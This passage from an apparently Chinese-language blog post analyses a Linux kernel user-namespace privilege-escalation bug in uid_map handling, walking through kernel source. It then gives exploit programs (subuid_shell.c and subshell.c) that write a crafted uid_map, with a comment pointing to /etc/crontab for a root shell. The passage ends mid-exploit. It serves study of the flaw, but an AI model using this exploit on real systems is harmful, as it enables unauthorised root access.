    &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
        extent &lt;/span&gt;=&lt;span&gt; map_id_range_down_max(extents, map, id, count);

    &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Map the id or note failure &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (extent)
        id &lt;/span&gt;= (id - extent-&amp;gt;first) + extent-&amp;gt;&lt;span&gt;lower_first;
    &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
        id &lt;/span&gt;= (u32) -&lt;span&gt;1&lt;/span&gt;&lt;span&gt;;

    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; id;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;直接调用的map_id_range_down_max，是一个二分搜索的封装，回顾用户输入数据，第2个参数表示要映射的父名称空间的起始位置，这个函数使用二分搜索，在父名称空间中找一个uid_gid_extent，而这个uid_gid_extent的[first,first+count-1]包含了子名称空间想映射的区间。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;42&quot;&gt;
&lt;pre&gt;
&lt;span&gt;/*&lt;/span&gt;&lt;span&gt;*
 * map_id_range_down_max - Find idmap via binary search in ordered idmap array.
 * Can only be called if number of mappings exceeds UID_GID_MAP_MAX_BASE_EXTENTS.
 &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;static&lt;/span&gt; &lt;span&gt;struct&lt;/span&gt; uid_gid_extent *&lt;span&gt;
map_id_range_down_max(unsigned extents, &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; uid_gid_map *&lt;span&gt;map, u32 id, u32 count)
{
    &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt;&lt;span&gt; idmap_key key;

    key.map_up &lt;/span&gt;= &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
    key.count &lt;/span&gt;=&lt;span&gt; count;
    key.id &lt;/span&gt;=&lt;span&gt; id;

    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; bsearch(&amp;amp;key, map-&amp;gt;&lt;span&gt;forward, extents,
               &lt;/span&gt;&lt;span&gt;sizeof&lt;/span&gt;(&lt;span&gt;struct&lt;/span&gt;&lt;span&gt; uid_gid_extent), cmp_map_id);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;回到map_id_range_down函数，取得这个uid_gid_extent之后，利用这个uid_gid_extent区更新了id并且返回，向前看，可以知道这个id是子名称空间中uid_gid_extent的lower_first字段，也就是想映射的父名称空间的起始位置。下面这句话将id的值更新位父名称空间的父名称空间的位置，由于所有的名称空间都是由一个根名称空间，一步一步嵌套下来，所以这和值最终代表的是整个系统中的uid值。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
id = (id - extent-&amp;gt;first) + extent-&amp;gt;lower_first;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;最后，回到map_write函数中，for循环的最后利用下面的语句更新了new_map中对应uid_gid_extent的lower_first字段&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
e-&amp;gt;lower_first = lower_first;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;map_write还剩下最后一部分，这部分就类似于写回，map_write传入了一个参数为map，从proc_uid_map_write函数可以知道这是当前名称空间的uid_gid_map，new_map是新建的，这部分的工作就是将new_map写回到map中（这个proc文件只能被写入一次，并且初始的时候是空的）。最后做了一些错误处理。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
    &lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Install the map &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;if&lt;/span&gt; (new_map.nr_extents &amp;lt;=&lt;span&gt; UID_GID_MAP_MAX_BASE_EXTENTS) {
        memcpy(map&lt;/span&gt;-&amp;gt;&lt;span&gt;extent, new_map.extent,
               new_map.nr_extents &lt;/span&gt;* &lt;span&gt;sizeof&lt;/span&gt;(new_map.extent[&lt;span&gt;0&lt;/span&gt;&lt;span&gt;]));
    } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
        map&lt;/span&gt;-&amp;gt;forward =&lt;span&gt; new_map.forward;
        map&lt;/span&gt;-&amp;gt;reverse =&lt;span&gt; new_map.reverse;
    }
    smp_wmb();
    map&lt;/span&gt;-&amp;gt;nr_extents =&lt;span&gt; new_map.nr_extents;

    &lt;/span&gt;*ppos =&lt;span&gt; count;
    ret &lt;/span&gt;=&lt;span&gt; count;
&lt;/span&gt;&lt;span&gt;out&lt;/span&gt;&lt;span&gt;:
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (ret &amp;lt; &lt;span&gt;0&lt;/span&gt; &amp;amp;&amp;amp; new_map.nr_extents &amp;gt;&lt;span&gt; UID_GID_MAP_MAX_BASE_EXTENTS) {
        kfree(new_map.forward);
        kfree(new_map.reverse);
        map&lt;/span&gt;-&amp;gt;forward =&lt;span&gt; NULL;
        map&lt;/span&gt;-&amp;gt;reverse =&lt;span&gt; NULL;
        map&lt;/span&gt;-&amp;gt;nr_extents = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
    }

    mutex_unlock(&lt;/span&gt;&amp;amp;&lt;span&gt;userns_state_mutex);
    kfree(kbuf);
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; ret;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;前面的sort_idmaps函数中，可以看到当数据数目大于5的时候，还创建了一个reverse的副本，然后进行了排序，然后就没有更改过了，最后将这个内存地址赋值给了map。&lt;/p&gt;
&lt;p&gt;来看看两个排序方式的区别&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;static&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; cmp_extents_forward(&lt;span&gt;const&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; *a, &lt;span&gt;const&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; *&lt;span&gt;b)
{
    &lt;/span&gt;&lt;span&gt;const&lt;/span&gt; &lt;span&gt;struct&lt;/span&gt; uid_gid_extent *e1 =&lt;span&gt; a;
    &lt;/span&gt;&lt;span&gt;const&lt;/span&gt; &lt;span&gt;struct&lt;/span&gt; uid_gid_extent *e2 =&lt;span&gt; b;

    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (e1-&amp;gt;first &amp;lt; e2-&amp;gt;&lt;span&gt;first)
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; -&lt;span&gt;1&lt;/span&gt;&lt;span&gt;;

    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (e1-&amp;gt;first &amp;gt; e2-&amp;gt;&lt;span&gt;first)
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;

    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
}

&lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; cmp function to sort() reverse mappings &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;static&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; cmp_extents_reverse(&lt;span&gt;const&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; *a, &lt;span&gt;const&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; *&lt;span&gt;b)
{
    &lt;/span&gt;&lt;span&gt;const&lt;/span&gt; &lt;span&gt;struct&lt;/span&gt; uid_gid_extent *e1 =&lt;span&gt; a;
    &lt;/span&gt;&lt;span&gt;const&lt;/span&gt; &lt;span&gt;struct&lt;/span&gt; uid_gid_extent *e2 =&lt;span&gt; b;

    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (e1-&amp;gt;lower_first &amp;lt; e2-&amp;gt;&lt;span&gt;lower_first)
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; -&lt;span&gt;1&lt;/span&gt;&lt;span&gt;;

    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (e1-&amp;gt;lower_first &amp;gt; e2-&amp;gt;&lt;span&gt;lower_first)
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;

    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;forward是用uid_gid_map中uid_gid_extent的first字段来进行排序，而reverse是利用lower_first字段进行排序&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;在前面调用map_id_range_down的for循环中，更新了e-&amp;gt;lower_first的值，而e是通过forward来找到的，所以说最终只是更新了forward中的值，而reverse中的值没有被更改，所以说这个reverse中的值是用户传进来的，如果先有一个名称空间n1，映射自己的root进程到kernel的普通进程，然后n1再创建一个名称空间n2，而将n1的root权限映射到n2的root权限，这样在n2中的uid_map中，forword指向的uid_gid_extent的第2项被更改了，但是&lt;/strong&gt;forword指向的没有被更改，还保持root到root的映射，所以通过这个reverse来判断的uid就会出现权限提升了。&lt;/p&gt;
&lt;p&gt;然后就是这个reverse的链表到底在哪里被用到，并且是用来干嘛的？&lt;/p&gt;
根据作者的介绍，在user_namespaces中对reverse这个变量的引用，可以知道直接利用的函数在from_kuid()中，被kuid_has_mapping()判断是否被映射，后者接着又被类似于 &lt;code&gt;inode_owner_or_capable()&lt;/code&gt; 和 &lt;code&gt;privileged_wrt_inode_uidgid()&lt;/code&gt;这样的权限检查函数所使用。&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;关于kuid_has_mapping()的使用方法其实可以参考unshare的实现，代码从unshare的系统调用服务例程开始，调用流程如下&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1、kernel/fork.c/SYSCALL_DEFINE1(unshare, unsigned long, unshare_flags)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2、kernel/user_namespaces.c/unshare_userns&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3、&lt;/strong&gt;kernel/user_namespaces.c/create_user_ns&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4、&lt;/strong&gt;&lt;strong&gt;kernel/user_namespaces.c/&lt;/strong&gt;kuid_has_mapping&lt;/p&gt;

&lt;p&gt;最后附上漏洞利用的代码，第一部分是subuid_shell.c，这是一个普通的unshare函数来创建一个新的名空间，主要流程如下：&lt;/p&gt;
&lt;p&gt;1、父进程fork子进程，之后子进程等待，父进程调用unshare创建一个新的名称空间&lt;/p&gt;
&lt;p&gt;2、父进程创建新的名称空间后等待，子进程写入uid_map等文件，设立映射条件&lt;/p&gt;
&lt;p&gt;3、子进程等待，父进程调用sh&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;75&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#define&lt;/span&gt; _GNU_SOURCE&lt;span&gt;
#include &lt;/span&gt;&amp;lt;err.h&amp;gt;&lt;span&gt;
#include &lt;/span&gt;&amp;lt;fcntl.h&amp;gt;&lt;span&gt;
#include &lt;/span&gt;&amp;lt;grp.h&amp;gt;&lt;span&gt;
#include &lt;/span&gt;&amp;lt;sched.h&amp;gt;&lt;span&gt;
#include &lt;/span&gt;&amp;lt;signal.h&amp;gt;&lt;span&gt;
#include &lt;/span&gt;&amp;lt;stdio.h&amp;gt;&lt;span&gt;
#include &lt;/span&gt;&amp;lt;stdlib.h&amp;gt;&lt;span&gt;
#include &lt;/span&gt;&amp;lt;sys/prctl.h&amp;gt;&lt;span&gt;
#include &lt;/span&gt;&amp;lt;sys/socket.h&amp;gt;&lt;span&gt;
#include &lt;/span&gt;&amp;lt;sys/un.h&amp;gt;&lt;span&gt;
#include &lt;/span&gt;&amp;lt;sys/wait.h&amp;gt;&lt;span&gt;
#include &lt;/span&gt;&amp;lt;unistd.h&amp;gt;

&lt;span&gt;int&lt;/span&gt; main(&lt;span&gt;void&lt;/span&gt;&lt;span&gt;)
{
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; sync_pipe[&lt;span&gt;2&lt;/span&gt;&lt;span&gt;];
    &lt;/span&gt;&lt;span&gt;char&lt;/span&gt;&lt;span&gt; dummy;
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (socketpair(AF_UNIX, SOCK_STREAM, &lt;span&gt;0&lt;/span&gt;&lt;span&gt;, sync_pipe))
        err(&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;pipe&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);

    pid_t child &lt;/span&gt;=&lt;span&gt; fork();
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (child == -&lt;span&gt;1&lt;/span&gt;&lt;span&gt;)
        err(&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;fork&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (child == &lt;span&gt;0&lt;/span&gt;&lt;span&gt;) {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; kill child if parent dies&lt;/span&gt;
&lt;span&gt;        prctl(PR_SET_PDEATHSIG, SIGKILL);
        close(sync_pipe[&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;&lt;span&gt;]);

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; create new ns&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (unshare(CLONE_NEWUSER))
            err(&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;unshare userns&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);

        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (write(sync_pipe[&lt;span&gt;0&lt;/span&gt;], &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;X&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;1&lt;/span&gt;) != &lt;span&gt;1&lt;/span&gt;&lt;span&gt;)
            err(&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;write to sock&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (read(sync_pipe[&lt;span&gt;0&lt;/span&gt;], &amp;amp;dummy, &lt;span&gt;1&lt;/span&gt;) != &lt;span&gt;1&lt;/span&gt;&lt;span&gt;)
            err(&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;read from sock&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; set uid and gid to 0, in child ns&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt; (setgid(&lt;span&gt;0&lt;/span&gt;&lt;span&gt;))
            err(&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;setgid&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (setuid(&lt;span&gt;0&lt;/span&gt;&lt;span&gt;))
            err(&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;setuid&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; replace process with bash shell, in which you will see &quot;root&quot;,
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; as the setuid(0) call worked
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; this might seem a little confusing, but you are &quot;root&quot; only to this child ns,
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; thus, no permission to the outside ns&lt;/span&gt;
        execl(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;/bin/bash&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;bash&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;, NULL);
        err(&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;exec&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
    }

    close(sync_pipe[&lt;/span&gt;&lt;span&gt;0&lt;/span&gt;&lt;span&gt;]);
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (read(sync_pipe[&lt;span&gt;1&lt;/span&gt;], &amp;amp;dummy, &lt;span&gt;1&lt;/span&gt;) != &lt;span&gt;1&lt;/span&gt;&lt;span&gt;)
        err(&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;read from sock&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; set id mapping (0..1000) for child process&lt;/span&gt;
    &lt;span&gt;char&lt;/span&gt; cmd[&lt;span&gt;1000&lt;/span&gt;&lt;span&gt;];
    sprintf(cmd, &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;echo deny &amp;gt; /proc/%d/setgroups&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, (&lt;span&gt;int&lt;/span&gt;&lt;span&gt;)child);
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (system(cmd))
        errx(&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;denying setgroups failed&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
    sprintf(cmd, &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;newuidmap %d 0 100000 1000&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, (&lt;span&gt;int&lt;/span&gt;&lt;span&gt;)child);
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (system(cmd))
        errx(&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;newuidmap failed&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
    sprintf(cmd, &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;newgidmap %d 0 100000 1000&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, (&lt;span&gt;int&lt;/span&gt;&lt;span&gt;)child);
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (system(cmd))
        errx(&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;newgidmap failed&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);

    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (write(sync_pipe[&lt;span&gt;1&lt;/span&gt;], &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;X&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;1&lt;/span&gt;) != &lt;span&gt;1&lt;/span&gt;&lt;span&gt;)
        err(&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;write to sock&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);

    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; status;
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (wait(&amp;amp;status) !=&lt;span&gt; child)
        err(&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;wait&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;然后是subshell.c函数，主要流程同上，只是子进程写入映射的数据不同，为什么是这些数据可以参考前面的漏洞分析部分&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;74&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#define&lt;/span&gt; _GNU_SOURCE&lt;span&gt;
#include &lt;/span&gt;&amp;lt;err.h&amp;gt;&lt;span&gt;
#include &lt;/span&gt;&amp;lt;fcntl.h&amp;gt;&lt;span&gt;
#include &lt;/span&gt;&amp;lt;grp.h&amp;gt;&lt;span&gt;
#include &lt;/span&gt;&amp;lt;sched.h&amp;gt;&lt;span&gt;
#include &lt;/span&gt;&amp;lt;stdio.h&amp;gt;&lt;span&gt;
#include &lt;/span&gt;&amp;lt;sys/socket.h&amp;gt;&lt;span&gt;
#include &lt;/span&gt;&amp;lt;sys/un.h&amp;gt;&lt;span&gt;
#include &lt;/span&gt;&amp;lt;sys/wait.h&amp;gt;&lt;span&gt;
#include &lt;/span&gt;&amp;lt;unistd.h&amp;gt;

&lt;span&gt;int&lt;/span&gt; main(&lt;span&gt;void&lt;/span&gt;&lt;span&gt;)
{
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; sync_pipe[&lt;span&gt;2&lt;/span&gt;&lt;span&gt;];
    &lt;/span&gt;&lt;span&gt;char&lt;/span&gt;&lt;span&gt; dummy;
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (socketpair(AF_UNIX, SOCK_STREAM, &lt;span&gt;0&lt;/span&gt;&lt;span&gt;, sync_pipe))
        err(&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;pipe&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; create a child process&lt;/span&gt;
    pid_t child =&lt;span&gt; fork();
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (child == -&lt;span&gt;1&lt;/span&gt;&lt;span&gt;)
        err(&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;fork&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (child == &lt;span&gt;0&lt;/span&gt;&lt;span&gt;) {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; in child process&lt;/span&gt;
        close(sync_pipe[&lt;span&gt;1&lt;/span&gt;&lt;span&gt;]);

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; this creates a new ns&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (unshare(CLONE_NEWUSER))
            err(&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;unshare userns&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (write(sync_pipe[&lt;span&gt;0&lt;/span&gt;], &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;X&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;1&lt;/span&gt;) != &lt;span&gt;1&lt;/span&gt;&lt;span&gt;)
            err(&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;write to sock&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);

        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (read(sync_pipe[&lt;span&gt;0&lt;/span&gt;], &amp;amp;dummy, &lt;span&gt;1&lt;/span&gt;) != &lt;span&gt;1&lt;/span&gt;&lt;span&gt;)
            err(&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;read from sock&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; start a bash process (replace process image)
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; this time you are actually root, without the name/id, though
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; technically the root access is not complete,
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; to get complete root, write to /etc/crontab and wait for a root shell to pop up&lt;/span&gt;
        execl(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;/bin/bash&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;bash&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;, NULL);
        err(&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;exec&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
    }

    close(sync_pipe[&lt;/span&gt;&lt;span&gt;0&lt;/span&gt;&lt;span&gt;]);
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (read(sync_pipe[&lt;span&gt;1&lt;/span&gt;], &amp;amp;dummy, &lt;span&gt;1&lt;/span&gt;) != &lt;span&gt;1&lt;/span&gt;&lt;span&gt;)
        err(&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;read from sock&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);

    &lt;/span&gt;&lt;span&gt;char&lt;/span&gt; pbuf[&lt;span&gt;100&lt;/span&gt;]; &lt;span&gt;//&lt;/span&gt;&lt;span&gt; path of uid_map&lt;/span&gt;
    sprintf(pbuf, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;/proc/%d&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, (&lt;span&gt;int&lt;/span&gt;&lt;span&gt;)child);

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; cd to /proc/pid/uid_map&lt;/span&gt;
    &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (chdir(pbuf))
        err(&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;chdir&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; our new id mapping with 6 extents (&amp;gt; 5 extents)&lt;/span&gt;
    &lt;span&gt;const&lt;/span&gt; &lt;span&gt;char&lt;/span&gt;* id_mapping = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;0 0 1\n1 1 1\n2 2 1\n3 3 1\n4 4 1\n5 5 995\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; write the new mapping to uid_map and gid_map&lt;/span&gt;
    &lt;span&gt;int&lt;/span&gt; uid_map = open(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;uid_map&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;, O_WRONLY);
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (uid_map == -&lt;span&gt;1&lt;/span&gt;&lt;span&gt;)
        err(&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;open uid map&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (write(uid_map, id_mapping, strlen(id_mapping)) !=&lt;span&gt; strlen(id_mapping))
        err(&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;write uid map&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
    close(uid_map);
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; gid_map = open(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;gid_map&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;, O_WRONLY);
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (gid_map == -&lt;span&gt;1&lt;/span&gt;&lt;span&gt;)
